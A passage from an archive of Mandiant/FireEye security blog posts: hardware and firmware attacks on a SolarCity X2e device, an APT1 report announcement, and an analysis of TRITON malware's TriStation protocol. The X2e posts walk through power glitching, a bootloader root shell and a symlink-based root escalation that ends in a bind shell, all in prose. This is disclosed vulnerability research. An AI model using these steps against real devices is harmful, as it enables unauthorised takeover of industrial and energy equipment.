5: Connecting to potential UART interface In addition to correctly identifying the UART pins and a UART to USB adapter, we also needed software to read/write from the interface as well as knowledge of the baud rate. Baud rates vary but typically follow standard values, including 9600, 14400, 19200, 38400, 57600, and 115200. Using the python module pySerial , we connected to the USB adapter and tried standard baud rates until one of the rates produced readable ASCII output (an incorrect baud rate will typically produce non-readable output), and determined the X2e used a baud rate of 115200. Upon booting the X2e, we noted output from the BootROM, bootloader (which was Das U-Boot 2009.8, a common embedded bootloader), as well as output from the Linux kernel transmitted over the UART connection, shown in Figure 6. Figure 6: UART boot messages Many configurations of U-Boot allow a physically connected user (using an interface such as UART) the ability to interrupt the boot process; however, this configuration explicitly disabled that feature, shown in Figure 7. Figure 7: Uninterruptable U-Boot bootloader on the X2e Interrupting a bootloader is attractive to an attacker, as often the boot parameters passed to the Linux operating system can be manipulated to control how it will load, such as booting into single user mode (typically a recover shell) or mounting filesystems as read-write. In the case of the X2e, the UART connection was mapped to a Linux TTY which required username and password authentication, shown in Figure 8. Figure 8: User authentication to Linux over UART Without any ability to interrupt the boot process or credentials to authenticate to the X2e, we were faced with another dead end. We then shifted our analysis to obtaining the firmware stored on the X2e’s non-volatile storage. Chip Removal and Data Extraction In this section, we’ll cover the basics of non-volatile memory, often referred to as “flash memory”, present on embedded devices as well as the process used to extract content from the chip. As mentioned, taking inventory of the components on the PCB is an important first step. Figure 9 shows the suspected flash chip present on the PCB magnified under a digital microscope. Figure 9: Closeup of Spansion flash The visible markings seen in Figure 9 are important as they allow us to determine the manufacturer and model of the flash, which will assist us with obtaining the datasheet for the chip. In our case, the NAND we were dealing with was a Spansion S34ML01G1, and its datasheet could be found here . NAND Overview Before we talk about acquiring the firmware from the NAND chip, it’s important to first understand the various scenarios that embedded devices typically follow. NAND verses NOR : These fundamentally different technologies each have their own benefits and drawbacks. NAND is cheap but suffers from high probability of “bad blocks,” or areas that are corrupt sometimes directly from the factory. As such, protections and considerations need to be present to be able to protect against this. NAND is also much faster to erase and write, making it ideal for storing file systems, kernels, and other pieces of code that may need to be reset or changed. NOR has significantly faster read times but is not as flexible with accessing data and has low erase and write speeds. NOR is usually used for low-level bootloaders, hardcoded firmware blobs, and other areas that are not expected to change frequently. The X2e uses a NAND flash. Serial verses Parallel : This refers to how the data is accessed and is typically visually identifiable. If there are a large number of pins, the flash is likely parallel. Serial NOR chips can be small in size and typically need eight or fewer pins to function. Common serial interfaces are Serial Peripheral Interface (SPI) or Inter-Integrated Circuit (I2C), while a common parallel interface for NAND is Open NAND Flash Interface (ONFI2.0, ONFI3.0). The X2e is a parallel flash. IC Form Factor : Another visually identifiable trait—form factor (or “package”)—refers to how the chip is attached to the PCB. There is a long list of options here , but common surface-mount flash packages include small outline package (SOP), thin outline small package (TOSP), or a variant of ball grid array (*BGA). The key distinction here is SOP and TOSP expose the pins, while BGA conceals the pins under the package. The X2e is BGA63, also referred to as a 63-pin BGA package. Managed verses Unmanaged Flash : This one is more applicable to NAND, for reasons alluded to in the NAND verses NOR section. As stated, NAND needs help to manage the integrity of the data. With unmanaged NAND, the IC reserves sections of the flash (often called “spare” area) for someone else to manage the data. This is typically implemented as either a kernel driver or an external NAND controller. Managed NAND means that the IC package includes the controller and transparently manages the data. This is extremely common in embedded devices, as either embedded MMC (eMMC) or universal flash storage (UFS). The X2e uses unmanaged flash and is controlled by the main microcontroller present on the PCB. With the basics out of the way, we proceeded with physically removing the chip from the PCB. Chip Removal Physical chip removal is considered a destructive approach but can certainly be performed without damaging the PCB or the flash chip itself. When presented with removal of BGA packages, the two most common removal techniques are either hot air or infrared light (IR). Commercial solutions exist for both hot air and IR, but cheaper options exist with hot air removal. We opted to use hot air on the X2e. To minimize damage to the PCB and flash, a PCB heater or oven can be used to slowly bring the entire PCB to a temperature right below the solder melting point. This will reduce the amount of time we need to focus our hot air directly onto the flash IC and help with reducing the heat dissipation into the PCB throughout the process. One final trick that can be used to minimize nearby chips from being damaged or lost (due to the air pressure) is the use of high-heat resistant tape, commonly referred to as Kapton tape. Figure 10 shows the PCB wrapped in Kapton tape to protect nearby components. Figure 10: High-heat resistant tape on PCB Figure 11 shows an example setup with the X2e PCB inserted into a PCB heater, with a hot air gun suspended over the IC. Figure 11: Hot air rework/reflow station While using the hot air to warm the IC and surrounding areas, we gently nudged the flash to see if the solder had become molten. Once the chip appeared to be floating, we quickly removed the chip and let it cool for about 30 seconds. Figure 12 shows the IC flash removed from the PCB, with the solder still present on the BGA pads. Figure 12: NAND removed from X2e Before inserting the NAND into a clam-shell chip reader, the leftover solder must be removed from the flash. This can be accomplished using a soldering iron, high-quality flux, and de-soldering wick. Once removed, isopropyl alcohol and a toothbrush are highly effective at removing the leftover flux residue and cleaning the chip. In the next section, we’ll attempt to extract the data from the NAND chip using a multi-purpose chip programmer. Data Extraction With the cleaned flash chip in hand, we can now explore options for reading the raw contents. Commercial forensic acquisition devices exist, but a quick eBay or AliExpress search will produce a multitude of generic chip readers. One such device, the XGecu Pro , supports a variety of adapters and chipsets and connects to a Windows machine using USB. It also comes with software to interface with the XGecu Pro and can even auto-detect flash. To connect the Spansion NAND to the XGecu Pro, we also purchased a clamshell BGA63 adapter. Figure 13 shows the NAND inserted into the clamshell reader, and Figure 14 shows the clamshell adapter connected to the XGecu Pro device. Figure 13: Spansion NAND in BGA clamshell adapter Figure 14: NAND adapter connected to XGecu Using the XGecu Pro software, we can read the entire contents of the flash to a binary file for further analysis. Since these are not commercial solutions, it is a good idea to perform two or three reads and then diff the extraction to confirm the content was read without errors. Firmware Analysis Cleaning and Mounting With our fresh NAND dump in hand, the next step was to parse out any relevant firmware blobs, configurations, or filesystems. The go-to tool for starting this process is binwalk . binwalk does a fantastic job of detecting filesystems, bootloaders, and kernels. In addition, binwalk can calculate entropy (detecting packed or encrypted data) and identify assembly opcodes. Figure 15 shows partial output of running binwalk against the NAND dump. Figure 15: Initial binwalk scan against NAND dump We can see from the output that binwalk successfully identified what it believes are U-Boot uImage headers, Linux kernel images, and more than a dozen Journaling Flash File System version 2 (JFFS2) filesystems. JFFS2 is a common filesystem used in embedded devices; Unsorted Block Image File System (UBIFS) and SquashFS would also be common. At first glance, the output appears to be promising; however, it is highly unlikely that there are actually that many JFFS2 filesystems present on our NAND. Another indication that something isn’t quite right are the hexadecimal offsets – they don’t appear to be clean, uniform offsets. It is far more common that the offsets of the items identified by binwalk would align with NAND page offsets, which are a multiple of 2048. In order to understand what is occurring here, we need to revisit a characteristic of unmanaged (or “raw”) NAND ICs described in the NAND Overview section. To recap, raw NAND requires additional bytes per page for use by higher-level components to attest to the validity of the page, typically implemented as a defined “bad block” marker and a per-page (or subpage) Error-Correcting Code (ECC). Without going too deep into ECC fundamentals, ECC provides the ability for higher-level processes to detect n number of bad bits on a page and to correct m number of bits. Since our goal here is not to perform forensics on the raw NAND, our immediate objective is to remove any ECC bytes or other non-data related bytes from the NAND dump. The MCU is ultimately the system manipulating the raw NAND, so understanding how our MCU, which was an NXP iMX28 series MCU, manages NAND is critical to being able to perform this. Fortunately for us, this process has already been explored by the security community , and iMX parsing libraries exist to manipulate the raw NAND dump and remove existing extraneous data. Figure 16 shows the results of re-running binwalk on the output of the imx-nand-convert script. Figure 16: binwalk scan of fixed NAND dump This time, we see only one JFFS2 filesystem, at the very round offset of 0x880000 . Using the extraction ( -e ) feature of binwalk , we can now obtain parsed versions of the U-Boot bootloader, Linux kernel, and JFFS2 system. The final hurdle we need to overcome is mounting the extracted JFFS2 filesystem in a way that allows us to explore the contents. On Linux, the easiest way to perform this is to use the mtd , mtdblock , and nandsim kernel modules . The nandsim module simulates a given NAND device and uses the mtd and JFFS2 subsystems to parse and manage appropriately. The key piece of information that needs to be passed to the nandsim module is the ONFI chip identifier, which can be obtained from the NAND datasheet or by requesting the ID from the IC using a generic reader (like the XGecu Pro used in the Data Extraction section). A list of supported IDs is also provided by the mtd maintainers . Getting the parameters correct is a bit of luck and magic and may require you to compile your own version of the nandsim module; that process will not be covered in this post. Figure 17 shows the steps required to simulate the correct Spansion NAND and mount the JFFS2 filesystem in the form of a Makefile target. Figure 17: Makefile target to mount JFFS2 filesystem By running make mount-jffs2 , we can quickly prep and mount the JFFS2 filesystem and explore the contents as we would any filesystem. Accessing the Filesystem In the last section of this post, we’ll walk through our analysis of the JFFS2 filesystem. Remember that our end goal is to obtain a remotely exploitable bug that will permit privileged code execution. With that in mind, some areas of interest are running daemons/processes, system startup logic, and credentials for services listening on the network. The first stop was reviewing the /etc/shadow file to see if there were password hashes for the root user as well as other system users. A quick check of this file determined there was no password hash for the root user, which indicated we would not be able to authenticate using password authentication. We noticed that two other password hashes were present, for the addpd and python users, shown in Figure 18. Figure 18: Connects of /etc/shadow The addpd user had a weak default password but was unable to authenticate using remote methods, and we were ultimately unable to crack the python user’s hash using internal GPU-based servers. Additionally, we were interested in processes that are launched during system boot or post-boot. The directory /WEB/python/ contained a ZIP archive called _x2e.zip , which contained over 200 compiled Python scripts (PYC files), which were loaded on system boot. Using the decompiler uncompyle2 , we unpacked these files for review. One file that stood out by name was password_manager.pyc , a file used to reset the login password upon successful boot-up. The file contained five hardcoded and plaintext credentials that mapped to the python system user. These credentials could be used to access the web interface and SSH, shown in Figure 19. Mandiant confirmed different passwords were used for different versions and connectivity states. Mandiant reported this to SolarCity and was assigned the CVE number CVE-2020-9306. Figure 19: Hardcoded credentials in password_manager.pyc With the correct password, we were finally able to connect to the web and SSH ports on a running X2e, but unfortunately only as the less-privileged python system user. While this was a great start, it didn’t satisfy our final objective, which was to remotely compromise the X2e as a privileged user. In Part Two of this blog series, we will explore additional avenues to further compromise the X2e. Conclusion In Part One of this two-part blog series, we covered an overview of the X2e, our initial network-based reconnaissance, PCB inspection techniques, physical debugging interface probing, chip-off techniques, and firmware analysis. Using these methodologies, we were successfully able to remotely compromise the X2e device as a non-administrative user due to hardcoded credentials (CVE-2020-9306). In Part Two, we will re-investigate physical attacks against the X2e in the form of glitch attacks, re-explore the U-Boot bootloader, and finally demonstrate an attack to remotely compromise the X2e device as a privileged user. To continue reading, check out Part Two now . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-02-19",
                    "source": "www.fireeye.com"
                },
                "text": "Today, The Mandiant® Intelligence Center™ released an unprecedented report exposing APT1's multi-year, enterprise-scale computer espionage campaign. APT1 is one of dozens of threat groups Mandiant tracks around the world and we consider it to be one of the most prolific in terms of the sheer quantity of information it has stolen. Highlights of the report include: Evidence linking APT1 to China's 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department (Military Cover Designator 61398). A timeline of APT1 economic espionage conducted since 2006 against 141 victims across multiple industries. APT1's modus operandi (tools, tactics, procedures) including a compilation of videos showing actual APT1 activity . The timeline and details of over 40 APT1 malware families. The timeline and details of APT1's extensive attack infrastructure. Mandiant is also releasing a digital appendix with more than 3,000 indicators to bolster defenses against APT1 operations. This appendix includes: Digital delivery of over 3,000 APT1 indicators, such as domain names, and MD5 hashes of malware. Thirteen (13) X.509 encryption certificates used by APT1. A set of APT1 Indicators of Compromise (IOCs) and detailed descriptions of over 40 malware families in APT1's arsenal of digital weapons. IOCs that can be used in conjunction with Redline ™, Mandiant's free host-based investigative tool, or with Mandiant Intelligent Response® (MIR) , Mandiant's commercial enterprise investigative tool. The scale and impact of APT1's operations compelled us to write this report. The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as a \"what if\" discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk of losing much of our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating from China, and we wanted to do our part to arm and prepare security professionals to combat the threat effectively. The issue of attribution has always been a missing link in the public's understanding of the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches. We recognize that no one entity can understand the entire complex picture that many years of intense cyber espionage by a single group creates. We look forward to seeing the surge of data and conversations a report like this will likely generate. Dan McWhorter Managing Director, Threat Intelligence Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-two.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-02-17",
                    "source": "www.fireeye.com"
                },
                "text": "In this post, we continue our analysis of the SolarCity ConnectPort X2e Zigbee device (referred to throughout as X2e device). In Part One , we discussed the X2e at a high level, performed initial network-based attacks, then discussed the hardware techniques used to gain a remote shell on the X2e device as a non-privileged system user. In this segment, we’ll cover how we obtained a privileged shell on the device locally using power glitching attacks, and explore CVE-2020-12878 , a vulnerability we discovered that permitted remote privilege escalation to the root user. Combined with CVE-2020-9306 (discussed in Part One), this would result in a complete remote compromise of the X2e device. Technical Analysis Recap Before we dive into next steps, let’s recap where we left off: The X2e has an exposed universal asynchronous transmit/receive (UART) interface, which allows a physically connected user to view (but not interrupt) the Das U-Boot (U-Boot) boot process, and given proper credentials, authenticate to the Linux operating system. Since we do not have root credentials, we put this thread on the backburner. We have a full NAND dump of the Spansion raw flash, which includes boot configuration, bootloader firmware, filesystems, and the Linux kernel image. This was used previously in Part One to obtain the hardcoded credential for the python user. Knowing that UART is present and access to the bootloader would be extremely valuable, we decided to revisit that thread. Gaining Privileged Access Locally Revisiting the Bootloader Figure 1 shows the U-Boot boot process displayed while connected via UART connection. In some cases, it is possible to send keyboard input to the device during a set period (usually one to four seconds) when the bootloader presents the message, “Hit any key to stop autoboot,” which interrupts the boot process and drops the user into a U-Boot shell. On the X2e, this feature has been disabled by setting the U-Boot configuration parameter CONFIG_BOOTDELAY to 0 . Figure 1: Uninterruptable U-Boot bootloader output One attack that has been documented to be successful to disrupt autoboot is to manipulate the bootloader’s ability to access the flash storage during the boot process. In certain circumstances where the U-Boot bootloader is unable to access its own configuration, it fails into a default environment, which may be less restricted. We decided to see if this would be possible on the X2e. These attacks, known as glitch attacks (or more officially known as fault-injection), are a type of side channel attack that attempts to cause a microcontroller unit (MCU) to skip instructions, perform wrong instructions, or fail to access flash memory . Various types of glitching attacks exist including electrical, thermal, and radiation. Based on our objective, we opted to try glitching the power between the MCU and the Spansion NAND flash. Note that glitch attacks can often cause damage to the components on a board or put the device in an unusable state. These types of attacks should be tested as either a last resort or against a secondary device you are comfortable with damaging. Glitching the Bootloader Based on previous research in this domain , we opted to target the data lines (I/O) between the MCU and NAND flash. Recall from Part One that the NAND flash on the X2e was the Spansion S34ML01G1, which was a 63-pin ball grid array (BGA) package. This chip is capable of supporting both 8-bit and 16-bit bus width, which corresponds to the number of I/O lines utilized. By using the datasheet for the flash and then querying the ONFI Device ID of our chip, we determined our chip was utilizing the 8-bit configuration, meaning eight I/O lines were present between the NAND flash and the MCU. For this attack, we focused on manipulating the power on the first ( I/O0 ) data line. Figure 2 shows the configuration of the BGA-63 pins, with I/O0 highlighted. Figure 2: Identifying I/O0 for NAND chip in the Spansion datasheet Because the pins are actually underneath the flash package, we needed to find an exposed lead that corresponded to I/O0 elsewhere on the PCB. One such method for tracing connections across a PCB is a continuity test. A continuity test (using a multimeter) sends a low current electrical signal across two points and produces an audible beep if the points are connected. Using this technique, we located an exposed test point (known as a via) on the bottom of the PCB. Figure 3 shows the I/O0 pin on the top of the PCB (under the NAND chip), and Figure 4 shows the I/O0 pin exposed on the bottom of the PCB. Figure 3: I/O0 on top of PCB (under NAND chip) Figure 4: I/O0 on bottom of PCB With exposed access to I/O0 located, we experimented with connecting this pin directly to a known ground ( GND ) pin at various points during the boot process. Figure 5 shows the device powering on with the metal tweezers connecting I/O0 to GND . Figure 5: Shorting I/O0 to GND While connected to the UART interface, we noted several different outcomes. When shorting the pin immediately after powering on, the device failed to produce any output or boot. When shorting after the bootloader finished loading (and handing off to the Linux kernel), the device would also force reboot. However, when timed perfectly between the bootloader loading and attempting to read its configuration, we noted that the bootloader would present different output, and the option to interrupt the boot process was possible with a four-second delay. By pressing keyboard input, we were successfully able to drop into a U-Boot shell, which is shown in Figure 6. Figure 6: Access to U-Boot bootloader shell While this was great progress, we noted that the current failback bootloader configuration was completely inoperable and certain NAND blocks had been marked as bad (as expected). To get our device back to a working state, we needed to revisit the NAND dump we generated in Part One. Repairing the Bootloader Configuration While the current configuration provided us a working shell, we needed to fix the damage we had done. This was performed in two steps: fixing the mistakenly marked bad blocks and then rebuilding the configuration. In our case, the nand utility and its sub-commands read , write , and scrub allowed us to inspect and manipulate pages and blocks of the NAND. The nand scrub command with a valid offset and size could be used to completely reset a segment of the NAND, which removed any bad block markers. The next challenge was determining what needed to be replaced in the damaged blocks and rebuilding the configuration. Since we had a valid NAND image, we revisited the sections read by the bootloader to determine what changes were needed. The format did not match a known format, so we wrote a simple parser in Python to read the binary structure, shown in Figure 7. Figure 7: Parsing bootloader nvram configuration from flash With details of how the configuration should look, we used the nand write to rebuild this section, byte by byte with the correct details. We also set the boot delay to be four seconds, so that we could always interrupt the bootloader once the new configuration was committed. Once we confirmed our changes were stable, we saved the configuration to flash and could access the bootloader without performing the aforementioned glitch attack. Accessing Linux as root User Now that we have unrestricted access to the bootloader, we can finally influence the rest of the boot process and achieve a privileged shell. We alluded to this in Part One, but the easiest way to turn an unlocked U-Boot shell into a root Linux shell is to adjust the boot arguments that U-Boot passes to the Linux kernel. In our case, this was accomplished by using the setenv utility to change the std_bootarg environment variable to be init=/bin/sh and instructing U-Boot to resume the standard boot process. Figure 8 shows the Linux shell presented over UART. Figure 8: root shell after bootloader At this point, we’ve demonstrated a repeatable method for achieving local privilege escalation. In the final segment, we’ll complete our attack by exploring an avenue to remotely escalate privileges. Gaining Privileged Access Remotely Since the X2e has only two available listening network services, it makes sense to reinvestigate these services. During Part One, we identified hardcoded credentials for the limited user python . This was useful for initial probing of the device while it was running, but where do we go from here? Embedded devices typically only have a handful of users, with a majority of functionality being performed by the root user. This presents an interesting opportunity for us to abuse overlap between actions performed by the root user on contents owned and controlled by the python user. By reviewing the boot process, we noted a large number of custom init scripts in the /etc/init.d/ directory. These scripts are executed at system start by the root user and were responsible for starting daemons and ensuring directories or files exist. One file in particular, /etc/init.d/S50dropbear.sh , was interesting to us, as it appeared to perform a number of actions on files within the directory specified by the $PYTHON_HOME variable, which was /WEB/python/ , shown in Figure 9. Figure 9: Unsafe operations on $PYTHON_HOME directory At first glance this may seem benign but considering that the /WEB/python/ directory is controllable by the python user, it means that we can potentially control actions taken by root . More specifically, the chown operation is dangerous, as the previous mkdir command can fail silently and result in an unsafe chown operation. To weaponize this, we can use symbolic links to point the /WEB/python/.ssh/ to other areas of the filesystem and coerce the root process into chown ’ing these files to be owned by the python user. The process we took to exploit this was as follows: Authenticate over SSH using hardcoded python user credentials. Create a symbolic link, /WEB/python/.ssh , that points to /etc/init.d/ . Reboot the X2e, forcing the system to re-execute /etc/init.d/S50dropbear.sh . After boot completes, create a malicious init script in /etc/init.d/ as the python user. Reboot the X2e, forcing the system to execute the new init script. While not the cleanest approach (it requires two reboots), it accomplishes the goal of achieving code execution as root . Figure 10 shows the output of our proof of concept. In this case, our malicious init script spawned a bind shell on TCP port 8080, so that we could connect in as root . Figure 10: Exploiting chown vulnerability to gain shell as user root And there we have it: a remote connection as root, by abusing two separate vulnerabilities. While not explored in this series, another viable avenue of attack would be to explore potential vulnerabilities in the web server listening on TCP ports 80 and 443; however, this was not an approach that we took. Conclusion We covered a wide variety of topics in this two-part series, including: Physical device inspection Identifying and exploring physical debugging interfaces (UART) Chip-off techniques to remove the NAND storage Binary analysis of the filesystems and bootloader configurations Power glitch attacks against the U-Boot bootloader Linux user space privilege escalation We hope that readers were able to learn from our experiences with the X2e and will be inspired to use these techniques in their own analysis. Finally, Mandiant would like to thank both Tesla/SolarCity and Digi International for their efforts to remediate these vulnerabilities and for their cooperation with releasing this blog series. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/06/totally-tubular-treatise-on-triton-and-tristation.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2018-06-07",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction In December 2017, FireEye's Mandiant discussed an incident response involving the TRITON framework . The TRITON attack and many of the publicly discussed ICS intrusions involved routine techniques where the threat actors used only what is necessary to succeed in their mission. For both INDUSTROYER and TRITON, the attackers moved from the IT network to the OT (operational technology) network through systems that were accessible to both environments. Traditional malware backdoors, Mimikatz distillates, remote desktop sessions, and other well-documented, easily-detected attack methods were used throughout these intrusions. Despite the routine techniques employed to gain access to an OT environment, the threat actors behind the TRITON malware framework invested significant time learning about the Triconex Safety Instrumented System (SIS) controllers and TriStation, a proprietary network communications protocol. The investment and purpose of the Triconex SIS controllers leads Mandiant to assess the attacker's objective was likely to build the capability to cause physical consequences. TriStation remains closed source and there is no official public information detailing the structure of the protocol, raising several questions about how the TRITON framework was developed. Did the actor have access to a Triconex controller and TriStation 1131 software suite? When did development first start? How did the threat actor reverse engineer the protocol, and to what extent? What is the protocol structure? FireEye’s Advanced Practices Team was born to investigate adversary methodologies, and to answer these types of questions, so we started with a deeper look at the TRITON’s own Python scripts. Glossary: TRITON – Malware framework designed to operate Triconex SIS controllers via the TriStation protocol. TriStation – UDP network protocol specific to Triconex controllers. TRITON threat actor – The human beings who developed, deployed and/or operated TRITON. Diving into TRITON's Implementation of TriStation TriStation is a proprietary network protocol and there is no public documentation detailing its structure or how to create software applications that use TriStation. The current TriStation UDP/IP protocol is little understood, but natively implemented through the TriStation 1131 software suite. TriStation operates by UDP over port 1502 and allows for communications between designated masters (PCs with the software that are “engineering workstations”) and clients (Triconex controllers with special communications modules) over a network. To us, the Triconex systems, software and associated terminology sound foreign and complicated, and the TriStation protocol is no different. Attempting to understand the protocol from ground zero would take a considerable amount of time and reverse engineering effort – so why not learn from TRITON itself? With the TRITON framework containing TriStation communication functionality, we pursued studying the framework to better understand this mysterious protocol. Work smarter, not harder, amirite? The TRITON framework has a multitude of functionalities, but we started with the basic components: TS_cnames.pyc # Compiled at: 2017-08-03 10:52:33 TsBase.pyc # Compiled at: 2017-08-03 10:52:33 TsHi.pyc # Compiled at: 2017-08-04 02:04:01 TsLow.pyc # Compiled at: 2017-08-03 10:46:51 TsLow.pyc (Figure 1) contains several pieces of code for error handling, but these also present some cues to the protocol structure. Figure 1: TsLow.pyc function print_last_error() In the TsLow.pyc’s function for print_last_error we see error handling for “TCM Error”. This compares the TriStation packet value at offset 0 with a value in a corresponding array from TS_cnames.pyc (Figure 2), which is largely used as a “dictionary” for the protocol. Figure 2: TS_cnames.pyc TS_cst array From this we can infer that offset 0 of the TriStation protocol contains message types. This is supported by an additional function, tcm_result, which declares type, size = struct.unpack('<HH', data_received[0:4]), stating that the first two bytes should be handled as integer type and the second two bytes are integer size of the TriStation message. This is our first glimpse into what the threat actor(s) understood about the TriStation protocol. Since there are only 11 defined message types, it really doesn't matter much if the type is one byte or two because the second byte will always be 0x00. We also have indications that message type 5 is for all Execution Command Requests and Responses, so it is curious to observe that the TRITON developers called this “Command Reply.” (We won’t understand this naming convention until later.) Next we examine TsLow.pyc’s print_last_error function (Figure 3) to look at “TS Error” and “TS_names.” We begin by looking at the ts_err variable and see that it references ts_result. Figure 3: TsLow.pyc function print_last_error() with ts_err highlighted We follow that thread to ts_result, which defines a few variables in the next 10 bytes (Figure 4): dir, cid, cmd, cnt, unk, cks, siz = struct.unpack('<, ts_packet[0:10]). Now things are heating up. What fun. There’s a lot to unpack here, but the most interesting thing is how this piece script breaks down 10 bytes from ts_packet into different variables. Figure 4: ts_result with ts_packet header variables highlighted Figure 5: tcm_result Referencing tcm_result (Figure 5) we see that it defines type and size as the first four bytes (offset 0 – 3) and tcm_result returns the packet bytes 4:-2 (offset 4 to the end minus 2, because the last two bytes are the CRC-16 checksum). Now that we know where tcm_result leaves off, we know that the ts_reply “cmd” is a single byte at offset 6, and corresponds to the values in the TS_cnames.pyc array and TS_names (Figure 6). The TRITON script also tells us that any integer value over 100 is a likely “command reply.” Sweet. When looking back at the ts_result packet header definitions, we begin to see some gaps in the TRITON developer's knowledge: dir, cid, cmd, cnt, unk, cks, siz = struct.unpack('<, ts_packet[0:10]). We're clearly speculating based on naming conventions, but we get an impression that offsets 4, 5 and 6 could be \"direction\", \"controller ID\" and \"command\", respectively. Values such as \"unk\" show that the developer either did not know or did not care to identify this value. We suspect it is a constant, but this value is still unknown to us. Figure 6: Excerpt TS_cnames.pyc TS_names array, which contain TRITON actor’s notes for execution command function codes TriStation Protocol Packet Structure The TRITON threat actor’s knowledge and reverse engineering effort provides us a better understanding of the protocol. From here we can start to form a more complete picture and document the basic functionality of TriStation. We are primarily interested in message type 5, Execution Command, which best illustrates the overall structure of the protocol. Other, smaller message types will have varying structure. Figure 7: Sample TriStation \"Allocate Program\" Execution Command, with color annotation and protocol legend Corroborating the TriStation Analysis Minute discrepancies aside, the TriStation structure detailed in Figure 7 is supported by other public analyses. Foremost, researchers from the Coordinated Science Laboratory (CSL) at University of Illinois at Urbana-Champaign published a 2017 paper titled \" Attack Induced Common-Mode Failures on PLC-based Safety System in a Nuclear Power Plant\". The CSL team mentions that they used the Triconex System Access Application (TSAA) protocol to reverse engineer elements of the TriStation protocol. TSAA is a protocol developed by the same company as TriStation. Unlike TriStation, the TSAA protocol structure is described within official documentation. CSL assessed similarities between the two protocols would exist and they leveraged TSAA to better understand TriStation. The team's overall research and analysis of the general packet structure aligns with our TRITON-sourced packet structure. There are some awesome blog posts and whitepapers out there that support our findings in one way or another. Writeups by Midnight Blue Labs , Accenture , and US-CERT each explain how the TRITON framework relates to the TriStation protocol in superb detail. TriStation's Reverse Engineering and TRITON's Development When TRITON was discovered, we began to wonder how the TRITON actor reverse engineered TriStation and implemented it into the framework. We have a lot of theories, all of which seemed plausible: Did they build, buy, borrow, or steal? Or some combination thereof? Our initial theory was that the threat actor purchased a Triconex controller and software for their own testing and reverse engineering from the \"ground up\", although if this was the case we do not believe they had a controller with the exact vulnerable firmware version, else they would have had fewer problems with TRITON in practice at the victim site. They may have bought or used a demo version of the TriStation 1131 software, allowing them to reverse engineer enough of TriStation for the framework. They may have stolen TriStation Python libraries from ICS companies, subsidiaries or system integrators and used the stolen material as a base for TriStation and TRITON development. But then again, it is possible that they borrowed TriStation software, Triconex hardware and Python connectors from government-owned utility that was using them legitimately. Looking at the raw TRITON code, some of the comments may appear oddly phrased, but we do get a sense that the developer is clearly using many of the right vernacular and acronyms, showing smarts on PLC programming. The TS_cnames.pyc script contains interesting typos such as 'Set lable', 'Alocate network accepted', 'Symbol table ccepted' and 'Set program information reponse'. These appear to be normal human error and reflect neither poor written English nor laziness in coding. The significant amount of annotation, cascading logic, and robust error handling throughout the code suggests thoughtful development and testing of the framework. This complicates the theory of \"ground up\" development, so did they base their code on something else? While learning from the TriStation functionality within TRITON, we continued to explore legitimate TriStation software. We began our search for \"TS1131.exe\" and hit dead ends sorting through TriStation DLLs until we came across a variety of TriStation utilities in MSI form. We ultimately stumbled across a juicy archive containing \"Trilog v4.\" Upon further inspection, this file installed \"TriLog.exe,\" which the original TRITON executable mimicked, and a couple of supporting DLLs, all of which were timestamped around August 2006. When we saw the DLL file description \"Tricon Communications Interface\" and original file name \"TricCom.DLL\", we knew we were in the right place. With a simple look at the file strings, \"BAZINGA!\" We struck gold. File Name tr1com40.dll MD5 069247DF527A96A0E048732CA57E7D3D Size 110592 Compile Date 2006-08-23 File Description Tricon Communications Interface Product Name TricCom Dynamic Link Library File Version 4.2.441 Original File Name TricCom.DLL Copyright Copyright © 1993-2006 Triconex Corporation The tr1com40.DLL is exactly what you would expect to see in a custom application package. It is a library that helps support the communications for a Triconex controller. If you've pored over TRITON as much as we have, the moment you look at strings you can see the obvious overlaps between the legitimate DLL and TRITON's own TS_cnames.pyc. Figure 8: Strings excerpt from tr1com40.DLL Each of the execution command \"error codes\" from TS_cnames.pyc are in the strings of tr1com40.DLL (Figure 8). We see \"An MP has re-educated\" and \"Invalid Tristation I command\". Even misspelled command strings verbatim such as \"Non-existant data item\" and \"Alocate network accepted\". We also see many of the same unknown values. What is obvious from this discovery is that some of the strings in TRITON are likely based on code used in communications libraries for Trident and Tricon controllers. In our brief survey of the legitimate Triconex Corporation binaries, we observed a few samples with related string tables. Pe:dllname Compile Date Reference CPP Strings Code Lagcom40.dll 2004/11/19 $Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21 1999 17:17:26  $ $Revision:   1.0 Tr1com40.dll 2006/08/23 $Workfile:   TR1STRS.CPP  $ $Modtime:   May 16 2006 09:55:20  $ $Revision:   1.4 Tridcom.dll 2008/07/23 $Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21 1999 17:17:26  $ $Revision:   1.0 Triccom.dll 2008/07/23 $Workfile:   TR1STRS.CPP  $ $Modtime:   May 16 2006 09:55:20  $ $Revision:   1.4 Tridcom.dll 2010/09/29 $Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21 1999 17:17:26  $ $Revision:   1.0 Tr1com.dll 2011/04/27 $Workfile:   TR1STRS.CPP  $ $Modtime:   May 16 2006 09:55:20  $ $Revision:   1.4 Lagcom.dll 2011/04/27 $Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21 1999 17:17:26  $ $Revision:   1.0 Triccom.dll 2011/04/27 $Workfile:   TR1STRS.CPP  $ $Modtime:   May 16 2006 09:55:20  $ $Revision:   1.4 We extracted the CPP string tables in TR1STRS and LAGSTRS and the TS_cnames.pyc 